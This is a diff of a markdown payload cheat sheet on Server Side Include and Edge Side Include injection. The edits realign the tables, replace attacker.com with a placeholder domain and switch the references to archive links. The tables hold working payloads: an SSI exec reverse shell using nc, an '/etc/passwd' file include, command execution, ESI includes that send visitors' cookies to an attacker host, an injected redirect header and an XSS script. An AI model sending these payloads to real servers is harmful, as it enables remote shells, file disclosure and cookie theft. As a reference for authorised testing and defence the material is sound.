@@ -25,15 +25,15 @@ SSI Injection occurs when an attacker can input Server Side Include directives i
 
 SSI format: `<!--#directive param="value" -->`
 
-| Description             | Payload                                  |
-| ----------------------- | ---------------------------------------- |
-| Print the date          | `<!--#echo var="DATE_LOCAL" -->`         |
-| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`      |
-| Print all the variables | `<!--#printenv -->`                      |
-| Setting variables       | `<!--#set var="name" value="Rich" -->`   |
-| Include a file          | `<!--#include file="/etc/passwd" -->`    |
-| Include a file          | `<!--#include virtual="/index.html" -->` |
-| Execute commands        | `<!--#exec cmd="ls" -->`                 |
+| Description             | Payload                                                                               |
+| ----------------------- | ------------------------------------------------------------------------------------- |
+| Print the date          | `<!--#echo var="DATE_LOCAL" -->`                                                      |
+| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`                                                   |
+| Print all the variables | `<!--#printenv -->`                                                                   |
+| Setting variables       | `<!--#set var="name" value="Rich" -->`                                                |
+| Include a file          | `<!--#include file="/etc/passwd" -->`                                                 |
+| Include a file          | `<!--#include virtual="/index.html" -->`                                              |
+| Execute commands        | `<!--#exec cmd="ls" -->`                                                              |
 | Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
 
 ## Edge Side Inclusion
@@ -46,30 +46,30 @@ Some surrogates will require ESI handling to be signaled in the Surrogate-Contro
 Surrogate-Control: content="ESI/1.0"
 ```
 
-| Description             | Payload                                  |
-| ----------------------- | ---------------------------------------- |
-| Blind detection         | `<esi:include src=http://attacker.com>`  |
-| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
-| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
-| Include a file          | `<esi:include src="supersecret.txt">` |
-| Display debug info      | `<esi:debug/>` |
-| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
-| Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
+| Description        | Payload                                                                                       |
+| ------------------ | --------------------------------------------------------------------------------------------- |
+| Blind detection    | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`                                              |
+| XSS                | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`                              |
+| Cookie stealer     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>`          |
+| Include a file     | `<esi:include src="supersecret.txt">`                                                         |
+| Display debug info | `<esi:debug/>`                                                                                |
+| Add header         | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->`                          |
+| Inline fragment    | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
-| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
-| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
-| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
-| Varnish Cache | Yes | No   | No      | Yes                       | Yes            |
-| Fastly   | Yes      | No   | No      | No                        | Yes            |
-| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
-| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |
-| NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |
+| Software                     |  Includes | Vars |  Cookies | Upstream Headers Required | Host Whitelist |
+| ---------------------------- | --------- | ---- | -------- | ------------------------- | -------------- |
+| Squid3                       | Yes       | Yes  | Yes      | Yes                       | No             |
+| Varnish Cache                | Yes       | No   | No       | Yes                       | Yes            |
+| Fastly                       | Yes       | No   | No       | No                        | Yes            |
+| Akamai ESI Test Server (ETS) | Yes       | Yes  | Yes      | No                        | No             |
+| NodeJS' esi                  | Yes       | Yes  | Yes      | No                        | No             |
+| NodeJS' nodesi               | Yes       | No   | No       | No                        | Optional       |
 
 ## References
 
-* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
-* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://www.youtube.com/watch?v=VUZGZnpSg8I)
-* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
-* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
-* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
-* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
+* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)
+* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)
+* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)
+* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
+* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
+* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
